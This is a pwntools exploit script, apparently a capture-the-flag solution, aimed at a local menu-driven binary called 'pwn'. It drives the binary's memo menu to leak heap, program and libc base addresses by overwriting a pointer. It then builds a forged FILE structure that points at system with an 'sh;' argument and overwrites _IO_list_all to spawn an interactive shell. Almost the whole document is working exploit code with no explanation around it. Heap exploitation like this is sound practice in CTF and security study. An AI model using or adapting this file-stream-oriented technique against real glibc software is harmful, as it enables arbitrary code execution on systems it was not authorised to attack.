from pwn import*
context(log_level="debug", arch="amd64", os="linux")
p=process("./pwn")
libc = ELF("./libc.so.6")
def fold(num):
    p.recvuntil("Enter your choice > ")
    p.sendline("1")
    p.recvuntil("Which direction?\n")
    p.sendline(str(num))

def edit(content):
    p.recvuntil("Enter your choice > ")
    p.sendline("2")
    p.recvuntil("Enter memo content > ")
    p.send(content)

def read():
    p.recvuntil("Enter your choice > ")
    p.sendline("3")

def delete():
    p.recvuntil("Enter your choice > ")
    p.sendline("4")

def play():
    p.recvuntil("Enter your choice > ")
    p.sendline("5")

def uninstall():
    p.recvuntil("Enter your choice > ")
    p.sendline("6")
    
def get_basic_info():
    p.recvuntil("Enter your choice > ")
    p.sendline("7")

def edit_basic_info(content):
    p.recvuntil("Enter your choice > ")
    p.sendline("8")
    p.recvuntil("Enter memo content > ")
    p.send(content)
    
# 下一次从被 free 的地址开始申请
# one gadget 0x583dc 0x583e3 0xef4ce 0xef52b
fold(231)
uninstall()
fold(123)
get_basic_info()
p.recvuntil("Basic info:\n")
p.recv(0x30)

heap_leak = u64(p.recv(6).ljust(8,b"\x00"))
# 0x7fca45625000 0x7fca45d93000
print(hex(heap_leak))
# edit pointer 123 的 0x18 的位置是 funcptr 的堆块
# leak proc
edit_basic_info(p64(0)*5+p64(0x100)+p64(heap_leak - 0x1000+0x10))
fold(231)
read()
p.recvuntil("Memo content:\n")
proc_leak = u64(p.recv(6).ljust(8,b"\x00"))
proc_base = proc_leak - 0x15bd
print(hex(proc_base))
# leak libc
fold(123)
edit_basic_info(p64(0)*5+p64(0x100)+p64(proc_base + 0x3f88))
fold(231)

read()
p.recvuntil("Memo content:\n")
libc_leak = u64(p.recv(6).ljust(8,b"\x00"))
libc_base = libc_leak - libc.sym["puts"]
print(hex(libc_base))
# arbituary address write
fold(123)
edit_basic_info(p64(0)*5+p64(0x100)+p64(heap_leak + 0x1000))
fold(231)
io_list_all = libc_base + 0x2044C0
system_addr = libc_base + libc.sym["system"]
heap_addr = heap_leak + 0x1000
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file = fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(heap_addr+0xe8)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(heap_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base)
fake_io_file+=p64(heap_addr)
fake_io_file += p64(0)+p64(heap_addr+0xe8)
edit(fake_io_file)
fold(123)
edit_basic_info(p64(0)*5+p64(0x100)+p64(io_list_all))
fold(231)
edit(p64(heap_addr))
fold(111)
p.interactive()
